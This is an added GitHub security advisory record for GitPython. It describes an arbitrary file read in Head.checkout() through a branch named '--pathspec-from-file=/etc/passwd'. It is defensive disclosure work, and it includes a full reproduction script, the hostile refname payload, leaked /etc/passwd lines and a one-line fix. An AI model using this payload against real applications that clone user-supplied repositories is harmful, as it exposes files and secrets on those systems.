@@ -1,0 +1,175 @@
+{
+  "id": "GHSA-23mf-xhv8-69c2",
+  "modified": "2026-10-27T15:47:08.812491596Z",
+  "published": "2026-10-27T15:28:03Z",
+  "aliases": [
+    "CVE-2026-110859"
+  ],
+  "summary": "GitPython: arbitrary file read via attacker-controlled branch name in `Head.checkout()` (incomplete fix of CVE-2026-78679)",
+  "details": "\u003e **A note on the referenced files.** This report was submitted through GitHub's private\n\u003e vulnerability reporting API, which carries no attachments. Every transcript this report leans\n\u003e on is reproduced **inline above**, verbatim. The file names it mentions (`poc.sh`, `poc.log`,\n\u003e per-case transcripts, `evidence.md`, `negative-controls.md`, blob-sweep tables) are the local\n\u003e evidence bundle those inline excerpts were extracted from, with a checksum manifest. I am happy\n\u003e to send the bundle by any channel you prefer, or to open a private fork — just say which. The\n\u003e PoC scripts are self-contained and reproduce the result from a clean environment.\n\n---\n\n**Affected:** `\u003c= 3.1.62` — all published releases; also `main` @ `4905b4af`\n**Verified at runtime:** GitPython `3.1.62` with git `2.55.0`\n**Date:** 2026-09-10\n**Reporter:** MAXI8594\n\n---\n\n## Threat model\n\n| | |\n|---|---|\n| **Attacker** | anyone who can get the application to clone a URL they control. No account, no credential, no privilege in the consuming application. |\n| **Pre-need** | a repository they host, with `HEAD` pointing at a branch whose name is the payload. A `git push` to a plain git server is enough — no filesystem access to a server is required (`raw/06`). |\n| **Gets** | the contents of any file the application's process can read, returned in band through the exception. `/etc/passwd` recovered 34 of 34 lines. |\n| **Real-world likelihood** | **High.** The vulnerable consumer is six lines of ordinary code with no unusual configuration: `Repo.clone_from(user_url)` then `repo.active_branch.checkout()`. `allow_unsafe_options=False` is the default. Cloning user-supplied URLs is the library's central use case — CI systems, repository importers, scanners and bots. |\n\n**On severity relative to the sibling advisories.** GitHub, as CNA, scored the three prior\nadvisories in this class at 6.5 / `PR:L` (CVE-2026-76217, CVE-2026-78678, CVE-2026-78679). This\nreport asks for 7.5 / `PR:N`, and the difference is one measured fact: in those three, the\napplication had to pass an attacker-influenced value into the API. Here it passes nothing — the\nclone materialises the hostile branch on its own and `repo.active_branch` returns it\n(`raw/02`). If that reading is not accepted, the `PR:L` path via `Repo.create_head()` is also real\nand lands at 6.5, matching the siblings.\n\n## Summary\n\n`Head.checkout()` guards its `**kwargs` against unsafe Git options but never inspects its own\npositional argument — the branch name — which reaches the `git checkout` argv with no `--`\nseparator. A repository whose default branch is named `--pathspec-from-file=/etc/passwd` makes a\nconsumer that merely clones it and checks out the default branch return the entire contents of that\nfile to the caller.\n\nThis is the exact combination of two advisories the project already fixed:\n\n- **CVE-2026-76217** (`GHSA-hh9p-6wh2-4mfc`) — *\"Arbitrary file read via `--pathspec-from-file` in\n  `IndexFile.remove()` **and `Head.checkout()`**\"*. Fixed in 3.1.58 by commit `f2550b65`, which added\n  the guard to this exact method — but only for `**kwargs`.\n- **CVE-2026-78679** (`GHSA-3wxw-xv34-2frg`) — *\"`TagReference.create` positional reference\n  bypasses kwargs-only `--file` guard, enabling arbitrary file read (incomplete fix of 3af0c251)\"*. Fixed in 3.1.59 by commit `1b0d2d9b`, which applied the\n  positional check to `git/refs/tag.py`, `git/diff.py`, `git/index/base.py` and `git/repo/base.py` —\n  but not to `git/refs/head.py:286`.\n\n`f2550b65` states in its own commit message that the audit found the positional variant and applied\nit to `HEAD.reset` — 185 lines above `Head.checkout`, in the same file, in the same commit:\n\n\u003e \"The audit also found that **reset's positional commit could carry the option before its argument\n\u003e separator**. […] **Check reset's positional commit as well as keyword options**\"\n\n`HEAD.reset` got the fix. `Head.checkout` did not, and `1b0d2d9b` did not come back for it.\n\n## Affected Asset\n\n| | |\n|---|---|\n| Package | `GitPython` (PyPI) |\n| Affected versions | **`\u003c= 3.1.62`** — all published releases |\n| Latest release tested | `3.1.62` |\n| Also present on | `main` @ `4905b4af` |\n| Vulnerable file | `git/refs/head.py` |\n| Guard | line 286 — `Git._option_candidates([], kwargs)` |\n| Sink | line 293 — `self.repo.git.checkout(self, **kwargs)` |\n| CWE | CWE-88 (Argument Injection), CWE-73 (External Control of File Name or Path), CWE-200 (Exposure of Sensitive Information) |\n| CVSS 3.1 | `AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N` → **7.5 High** |\n\nThe version range was established by **blob hash against every tag**, not by dates: the sink line\n`self.repo.git.checkout(self, **kwargs)` — with no `--` separator — is present in `git/refs/head.py`\nin every tag from `0.3.1-beta2` through `3.1.62`. The `3.1.62` blob is byte-identical to `main`:\n`7f563374ef9e018b3d5f95054498e8591e112ce2`. Full sweep in `raw/07-blob-version-sweep.txt`.\n\nThe kwargs-only guard first appears in **3.1.58**, so `3.1.58`–`3.1.62` is where \"incomplete fix\"\napplies; earlier releases have the same sink with no guard at all.\n\n## Vulnerability Details\n\n### Root cause\n\n`git/cmd.py:1045` — `_option_candidates()` only inspects the positionals it is handed:\n\n```python\n@classmethod\ndef _option_candidates(cls, args: Sequence[Any] = (), kwargs: Optional[Mapping[str, Any]] = None) -\u003e List[str]:\n    \"\"\"Collect possible option spellings before command-line transformation.\"\"\"\n    options = [\n        option for option in cls._unpack_args([arg for arg in args if arg is not None]) if option.startswith(\"-\")\n    ]\n```\n\nSo `_option_candidates([], kwargs)` means: *check the keyword arguments, never check the positional\narguments this method puts on the command line.* That is fine when the method has no\nattacker-influenced positional, or when it separates them with `--`.\n\n`git/refs/head.py:283-293` — `Head.checkout()` has neither:\n\n```python\n        if not allow_unsafe_options:\n            Git.check_unsafe_options(\n                options=Git._option_candidates([], kwargs),\n                unsafe_options=Git.unsafe_git_pathspec_from_file_options,\n            )\n        kwargs[\"f\"] = force\n        if kwargs[\"f\"] is False:\n            kwargs.pop(\"f\")\n\n        self.repo.git.checkout(self, **kwargs)\n```\n\n`self` is the only positional. It serialises to the branch name, lands in the `git checkout` argv,\nand is not in the list the guard inspects. `_call_process` builds `args_list = opt_args + ext_args`,\nso keyword-derived options precede positionals — which is why the rest of the library puts `\"--\"`\nfirst (`Remote.fetch/pull/push`, `Repo._clone`, `Repo.archive`, `IndexFile.remove`, `Commit.count`\nall do). `Head.checkout` does not.\n\n### Why the branch name is attacker-controlled\n\nGit accepts a refname whose branch component begins with `-` and contains `/`\n(`raw/02-refname-accepted-and-cloned.txt`):\n\n```\n\u003e\u003e\u003e git check-ref-format 'refs/heads/--pathspec-from-file=/etc/passwd'\n    exit=0  stderr=''\n    =\u003e un refname que empieza con '-' y lleva '/' es VALIDO para git\n\n\u003e\u003e\u003e git -C \u003cbare\u003e update-ref 'refs/heads/--pathspec-from-file=/etc/passwd' beea87239099\n    exit=0  stderr=''\n\u003e\u003e\u003e git -C \u003cbare\u003e symbolic-ref HEAD 'refs/heads/--pathspec-from-file=/etc/passwd'\n    exit=0\n    HEAD del bare = refs/heads/--pathspec-from-file=/etc/passwd\n    ref en disco como arbol jerarquico: True\n\n\u003e\u003e\u003e Repo.clone_from('file://\u003cbare\u003e', \u003cvictim\u003e)   # la app solo clona\n    ramas LOCALES creadas por el clone, sin que nadie las pida:\n      refs/heads/--pathspec-from-file=/etc/passwd\n    repo.active_branch.name = '--pathspec-from-file=/etc/passwd'\n    coincide con el nombre hostil: True\n```\n\nThe transcript above also shows the second half: `git clone` **materialises that branch locally on\nits own** when the remote `HEAD` points at it — the consuming application never asks for it.\n\nA plain git server accepts the refname over `receive-pack`, with no `--force` and no special config\n(`raw/06-push-accepts-refname.txt`), so the attacker does not need filesystem access to a server —\na `git push` is enough. That measurement, and the clone in `raw/02`, both use the `file://`\ntransport, which exercises the same git wire protocol as `https://`; I did not test against a\nhosted forge, since that would mean writing to a third party.\n\n### Why the leak reaches the caller\n\nThe file contents are in `CommandError.__str__`, not only in the `.stderr` attribute\n(`git/exc.py`):\n\n```python\n        self.stderr = stderr_decode and \"\\n  stderr: '%s'\" % stderr_decode or \"\"\n\n    def __str__(self) -\u003e str:\n        return (self._msg + \"\\n  cmdline: %s%s%s\") % (\n            self._cmd, self._cause, self._cmdline, self.stdout, self.stderr,\n        )\n```\n\nSo `logging.exception(...)`, `print(e)`, or simply **not catching** the exception all disclose the\nfile. The developer does not have to know `.stderr` exists.\n\n### Full chain\n\n```\nRepo.clone_from(\u003cattacker URL\u003e)\n  ↓  remote HEAD points at refs/heads/--pathspec-from-file=/etc/passwd\n  ↓  git clone creates that LOCAL branch unasked\nrepo.active_branch                → Head with name = \"--pathspec-from-file=/etc/passwd\"\n  ↓\nHead.checkout()                   git/refs/head.py:286 — guard inspects kwargs only\n  ↓  self.repo.git.checkout(self, **kwargs)   git/refs/head.py:293 — no \"--\"\ngit checkout --pathspec-from-file=/etc/passwd\n  ↓  git emits one `error:` per unmatched pathspec — one per line of the file\nGitCommandError → CommandError.__str__ → the consumer\n```\n\n## Steps to Reproduce\n\nEnvironment: GitPython 3.1.62, git 2.55.0, Linux x86_64, disposable venv. Everything local —\ntemporary repositories and the `file://` transport. No remote hosts, no third-party repositories.\n\nThe bundled `poc.sh` runs all seven scenarios as a single unit and writes `poc.log` plus one file per\nscenario under `raw/`. Minimal manual reproduction:\n\n```bash\npython3 -m venv /tmp/gp \u0026\u0026 /tmp/gp/bin/python -m pip install gitpython==3.1.62\n\nW=$(mktemp -d)\ngit init -q -b main \"$W/a\"; echo x \u003e \"$W/a/f.txt\"\ngit -C \"$W/a\" add f.txt\ngit -C \"$W/a\" -c user.email=a@b -c user.name=a commit -qm c\ngit clone -q --bare \"$W/a\" \"$W/a.git\"\nSHA=$(git -C \"$W/a.git\" rev-parse HEAD)\n\n# the attacker names their default branch after the file they want\ngit -C \"$W/a.git\" update-ref   'refs/heads/--pathspec-from-file=/etc/passwd' \"$SHA\"\ngit -C \"$W/a.git\" symbolic-ref HEAD 'refs/heads/--pathspec-from-file=/etc/passwd'\n\ncat \u003e \"$W/consumer.py\" \u003c\u003c'PYEOF'\nimport logging, sys, git\nlogging.basicConfig(level=logging.INFO, format=\"%(message)s\")\ntry:\n    repo = git.Repo.clone_from(sys.argv[1], sys.argv[2])   # user-supplied URL\n    repo.active_branch.checkout()                          # ensure a clean working tree\nexcept git.exc.GitCommandError:\n    logging.exception(\"clone failed\")\nPYEOF\n\n/tmp/gp/bin/python \"$W/consumer.py\" \"file://$W/a.git\" \"$W/victim\"\n```\n\n### Raw Request\n\nThe real `git checkout` argv, captured by instrumenting `Git.execute` (`raw/01-real-argv.txt`).\nThis is the command GitPython actually built — the branch name became an option:\n\n```\n  argv real : ['git', 'checkout', '--pathspec-from-file=/tmp/gpargv-9im8ao2d/SECRET.txt']\n```\n\n### Raw Response\n\nObserved output (`raw/05-six-line-consumer.txt`, tail) — git emits one `error:` line per unmatched\npathspec, which is one per line of the target file:\n\n```\nerror: pathspec 'mysql:x:958:958:MariaDB:/var/lib/mysql:/usr/bin/nologin' did not match any file(s) known to git\nerror: pathspec 'flatpak:x:957:957:Flatpak system helper:/:/usr/bin/nologin' did not match any file(s) known to git\nerror: pathspec 'wazuh:x:956:955:Wazuh Agent:/var/ossec:/usr/sbin/nologin' did not match any file(s) known to git\nerror: pathspec 'jdownloader:x:955:954:jdownloader:/opt/JDownloader/:/bin/false' did not match any file(s) known to git\nerror: pathspec 'cups-browsed:x:953:953:CUPS printer discovery:/:/usr/bin/nologin' did not match any file(s) known to git'\n```\n\n`raw/03-full-file-disclosure.txt` counts the recovery against the real file:\n\n```\nArchivo objetivo: /etc/passwd  (34 lineas no vacias)\n[CASO] repo.active_branch.checkout()  — nadie paso un nombre de rama\n  repo.active_branch.name = '--pathspec-from-file=/etc/passwd'\n  -\u003e GitCommandError. Lineas de /etc/passwd recuperadas: 34 de 34\n```\n\n## Impact\n\nAn attacker who can get an application to clone a repository they control reads any file the\napplication's process can read, with the contents returned in band. `/etc/passwd` was recovered in\nfull (34 of 34 lines) in the run recorded in `poc.log`.\n\nThe attacker needs **no account and no privilege in the consuming application**, and no\nconfiguration change anywhere: `allow_unsafe_options=False` is the default, and the vulnerable\nconsumer is six lines of ordinary code. This is the central use case of the library — CI systems,\nrepository importers, scanners and bots that clone user-supplied URLs.\n\n### Impact precondition\n\n**Holds if:** the consuming application clones a repository whose default branch name the attacker\nchose, and then calls `Head.checkout()` on it — most commonly as `repo.active_branch.checkout()`,\nwhich needs no branch-name input from the application at all.\n\n**Source writer:** the attacker, via the remote repository's `HEAD` and refs. Verified two ways —\n`git update-ref` + `symbolic-ref` on a bare repository, and `git push` to a plain git server, which\n`receive-pack` accepts without `--force` or special configuration\n(`raw/02-refname-accepted-and-cloned.txt`, `raw/06-push-accepts-refname.txt`). The application never\nwrites the branch name; `git clone` materialises it.\n\n**Observed in:** `validation/gitpython/head-checkout-positional-pathspec/` — GitPython 3.1.62\n(latest release) with git 2.55.0, in the single run recorded in `poc.log`\n(2026-09-10T02:10:23-03:00). File read: `/etc/passwd`, 34 of 34 lines recovered by the caller.\n\n\n### Limits, stated plainly\n\n- Only the full long spelling works, because a refname cannot contain a space and is therefore a\n  single argv token; `git` rejects the abbreviated forms. This was established while developing the\n  payload and is **not** part of the attached run — the run exercises the working spelling only.\n- The attacker must know an absolute path to the target file.\n- Lines are disclosed only when they do not match a path in the repository. With a one-file hostile\n  repository none of them do, so the attacker controls this condition too.\n- The full-file result was measured on **git 2.55.0**, where `git checkout` emits one `error:` per\n  unmatched pathspec. `GHSA-hh9p-6wh2-4mfc` notes that `--pathspec-from-file` alone quotes only the\n  first line — that holds for `git rm`, which aborts with `fatal:` on the first. It does not hold for\n  `git checkout` on 2.55.0.\n\n## Negative control\n\nFull statement of what each control isolates and what would invalidate it: `negative-controls.md`.\nEvery batch opens **and closes** with a positive control; if the closing one does not fire, the batch\nis discarded.\n\n**Positive control (opening and closing, 4 batches).** `Head.checkout(pathspec_from_file=\"/etc/passwd\")`\n— the same payload via kwargs. Fires in every batch:\n`UnsafeOptionError: --pathspec-from-file is not allowed, use allow_unsafe_options=True to allow it`.\nThis proves the guard exists, is active under the default, and recognises the option — so a null\nresult elsewhere cannot be the instrument failing to reach the code.\n\n**Negative control.** The identical call on a branch named `benigna`. One variable changes: the\nleading `-`. Result: `['git', 'checkout', 'benigna']`, no exception, 0 lines disclosed.\n\n**Precision control — the asymmetry inside one file** (`raw/04-precision-control-reset-vs-checkout.txt`).\nThe same payload against the two methods in `git/refs/head.py` that received the guard in the same\ncommit, 185 lines apart:\n\n```\n[CONTROL DE PRECISION] mismo archivo, mismo commit de fix, dos metodos\n  HEAD.reset(commit=PAYLOAD)  guard SI mira el posicional BLOQUEADO por el guard (--pathspec-from-file i fuga= 0 lineas  [OK]\n  Head.checkout()      guard NO mira el posicional     GitCommandError                                fuga=34 lineas  [OK]\n```\n\n`HEAD.reset` (`head.py:101`, `_option_candidates([commit], kwargs)`) blocks what `Head.checkout`\n(`head.py:286`, `_option_candidates([], kwargs)`) lets through. This rules out the alternative\nexplanation that any string containing `--pathspec-from-file` reaching git would disclose the file.\n\n## Remediation\n\nOne line, consistent with what `f2550b65` already did for `HEAD.reset` in this same file:\n\n```python\n                options=Git._option_candidates([self], kwargs),\n```\n\n**The other candidate was evaluated and rejected.** Writing\n`self.repo.git.checkout(\"--\", self, **kwargs)` would match the `--` pattern used elsewhere in the\nlibrary and would also cover future `git checkout` options — but it **changes the semantics and\nbreaks the method**: in `git checkout -- \u003carg\u003e`, everything after `--` is a *pathspec*, not a branch.\nThe command would stop switching branches and start restoring files. The `--` pattern works for\n`fetch`/`pull`/`push`/`clone`/`archive`/`rm` because their positionals genuinely are non-branch\noperands; it does not transfer here.\n\nFor defence in depth, `Repo.create_head()` could reject branch names beginning with `-`, which would\nalso close the weaker `PR:L` path. That is a separate, optional change.\n\n## Prior art and de-duplication\n\nAll GitPython advisories in the GitHub database were reviewed —\n`gh api advisories -f ecosystem=pip -f affects=GitPython -f per_page=100 --paginate` returns **47**\n(the same command without `per_page` returns only the first page of 30). `Head.checkout` appears in\ntwo rows, one of which (`GHSA-w672-…`) is a withdrawn duplicate, leaving one substantive advisory:\n\n- **`GHSA-hh9p-6wh2-4mfc` / CVE-2026-76217** — same method, but the **kwargs** path\n  (`pathspec_from_file=…, pathspec_file_nul=True`), fixed in 3.1.58. That path is closed today; it is\n  the positive control in every batch of this report. The **positional** path is not covered by it.\n\nNeighbours, none overlapping:\n\n- **`GHSA-3wxw-xv34-2frg` / CVE-2026-78679** — the same **class** (positional bypasses a kwargs-only\n  guard) in a different method, `TagReference.create`, fixed in 3.1.59 by `1b0d2d9b`. That is the\n  patch that did not come back to `head.py:286`.\n- **`GHSA-956x-8gvw-wg5v` / CVE-2026-67323** — precedent for \"a value placed before the `--` with no\n  leading-dash check\", in `Repo.iter_commits` / `Repo.blame`. Those sites now pass their positional\n  to the guard; this one does not.\n- **`GHSA-7545-fcxq-7j24` / CVE-2026-44243** — path traversal via ref names in the reference APIs.\n  Different sink (filesystem path construction) and different impact (write and delete), but it\n  establishes that attacker-influenced ref names is a premise this project has already accepted.\n\n### No open fix proposal\n\nSearched across three surfaces, because `gh search issues` excludes pull requests: `gh search prs`,\n`gh search issues` and the raw `search/issues` API. **No open or closed issue or pull request\nproposes passing the positional to the guard in `Head.checkout`.** The three PRs that touch this\nguard (#2204, #2180, #2163) are all merged and none of them does it — #2204 is the PR that\nintroduced *both* call sites in this file, one checking its positional and one not. Full matrix in\n`dup-check.md`.\n\n### The project's own tests carry the same asymmetry\n\n`test/test_refs.py` exercises the guard for both methods, and covers exactly the difference this\nreport is about:\n\n- `HEAD.reset` — the **positional** is tested (lines 304-308).\n- `Head.checkout` — only the **kwargs** path is tested (lines 282-291).\n\nSo the positional variant is a case the suite already knows how to write; it just was not written\nfor `checkout`. The docstring added by #2204 to `Head.checkout` states that `--pathspec-from-file`\nrequires opt-in via `allow_unsafe_options` — which is precisely the guarantee the positional path\ndoes not deliver. Nothing in the project declares the positional acceptable here.\n\n### Why the one-line fix works, which is not obvious\n\n`Reference.__str__` returns `self.name`, not `self.path`. `Reference.name` strips the first two\npath components (`reference.py:122-132`), so a `Head` constructed on\n`refs/heads/--pathspec-from-file=/etc/passwd` passes `check_path` — the *path* does begin with\n`refs/heads/` — while `str()` yields the bare option. Passing `[self]` to `_option_candidates` makes\nthe guard see that same serialised string, which is why the one-line change closes it.\n\n## Evidence\n\n| File | What it establishes |\n|---|---|\n| `poc.sh` | driver — runs all seven scenarios as one unit |\n| `poc.log` | full transcript of the single reference run |\n| `raw/00-versions-and-source.txt` | version under test is the published one; guard and sink present; `def checkout(` appears once, so the sink line is unambiguous |\n| `raw/01-real-argv.txt` | real `git checkout` argv, captured by instrumenting `Git.execute` |\n| `raw/02-refname-accepted-and-cloned.txt` | git accepts the refname; `Repo.clone_from` materialises it unasked |\n| `raw/03-full-file-disclosure.txt` | 34 of 34 lines of `/etc/passwd` recovered |\n| `raw/04-precision-control-reset-vs-checkout.txt` | `HEAD.reset` blocks what `Head.checkout` allows |\n| `raw/05-six-line-consumer.txt` | six-line consumer, verbatim; leaks when the exception is logged and when it is uncaught |\n| `raw/06-push-accepts-refname.txt` | a plain git server accepts the refname over `push` |\n| `raw/07-blob-version-sweep.txt` | affected range by blob hash, tag by tag |\n| `negative-controls.md` | what each control isolates and what would invalidate it |\n| `evidence.sha256` | integrity of every raw file and script |\n\n## Disclosure\n\nReported privately through GitHub private vulnerability reporting. No third-party systems were\ntouched: every repository in this report is a temporary local one, and all transport is `file://`.",
+  "affected": [
+    {
+      "package": {
+        "ecosystem": "PyPI",
+        "name": "gitpython",
+        "purl": "pkg:pypi/gitpython"
+      },
+      "ranges": [
+        {
+          "type": "ECOSYSTEM",
+          "events": [
+            {
+              "introduced": "0"
+            },
+            {
+              "fixed": "3.2.0"
+            }
+          ]
+        }
+      ],
+      "versions": [
+        "0.1.7",
+        "0.2.0-beta1",
+        "0.3.0-beta1",
+        "0.3.0-beta2",
+        "0.3.1-beta2",
+        "0.3.2",
+        "0.3.2.1",
+        "0.3.2.RC1",
+        "0.3.3",
+        "0.3.4",
+        "0.3.5",
+        "0.3.6",
+        "0.3.7",
+        "1.0.0",
+        "1.0.1",
+        "1.0.2",
+        "2.0.0",
+        "2.0.1",
+        "2.0.2",
+        "2.0.3",
+        "2.0.4",
+        "2.0.5",
+        "2.0.6",
+        "2.0.7",
+        "2.0.8",
+        "2.0.9",
+        "2.0.9.dev0",
+        "2.0.9.dev1",
+        "2.1.0",
+        "2.1.1",
+        "2.1.10",
+        "2.1.11",
+        "2.1.12",
+        "2.1.13",
+        "2.1.14",
+        "2.1.15",
+        "2.1.2",
+        "2.1.3",
+        "2.1.4",
+        "2.1.5",
+        "2.1.6",
+        "2.1.7",
+        "2.1.8",
+        "2.1.9",
+        "3.0.0",
+        "3.0.1",
+        "3.0.2",
+        "3.0.3",
+        "3.0.4",
+        "3.0.5",
+        "3.0.6",
+        "3.0.7",
+        "3.0.8",
+        "3.0.9",
+        "3.1.0",
+        "3.1.1",
+        "3.1.10",
+        "3.1.11",
+        "3.1.12",
+        "3.1.13",
+        "3.1.14",
+        "3.1.15",
+        "3.1.16",
+        "3.1.17",
+        "3.1.18",
+        "3.1.19",
+        "3.1.2",
+        "3.1.20",
+        "3.1.22",
+        "3.1.23",
+        "3.1.24",
+        "3.1.25",
+        "3.1.26",
+        "3.1.27",
+        "3.1.28",
+        "3.1.29",
+        "3.1.3",
+        "3.1.30",
+        "3.1.31",
+        "3.1.32",
+        "3.1.33",
+        "3.1.34",
+        "3.1.35",
+        "3.1.36",
+        "3.1.37",
+        "3.1.38",
+        "3.1.4",
+        "3.1.40",
+        "3.1.41",
+        "3.1.42",
+        "3.1.43",
+        "3.1.44",
+        "3.1.45",
+        "3.1.46",
+        "3.1.47",
+        "3.1.48",
+        "3.1.49",
+        "3.1.5",
+        "3.1.50",
+        "3.1.51",
+        "3.1.52",
+        "3.1.53",
+        "3.1.54",
+        "3.1.55",
+        "3.1.56",
+        "3.1.57",
+        "3.1.58",
+        "3.1.59",
+        "3.1.6",
+        "3.1.60",
+        "3.1.61",
+        "3.1.62",
+        "3.1.7",
+        "3.1.8",
+        "3.1.9"
+      ],
+      "database_specific": {
+        "last_known_affected_version_range": "\u003c= 3.1.62",
+        "source": "https://github.com/github/advisory-database/blob/main/advisories/github-reviewed/2026/10/GHSA-23mf-xhv8-69c2/GHSA-23mf-xhv8-69c2.json"
+      }
+    }
+  ],
+  "references": [
+    {
+      "type": "WEB",
+      "url": "https://github.com/gitpython-developers/GitPython/security/advisories/GHSA-23mf-xhv8-69c2"
+    },
+    {
+      "type": "WEB",
+      "url": "https://github.com/gitpython-developers/GitPython/pull/2233"
+    },
+    {
+      "type": "WEB",
+      "url": "https://github.com/gitpython-developers/GitPython/commit/8da65080849a56a2fc9f3e7817bbf0524e8397d5"
+    },
+    {
+      "type": "PACKAGE",
+      "url": "https://github.com/gitpython-developers/GitPython"
+    },
+    {
+      "type": "WEB",
+      "url": "https://github.com/gitpython-developers/GitPython/releases/tag/3.2.0"
+    }
+  ]
+}
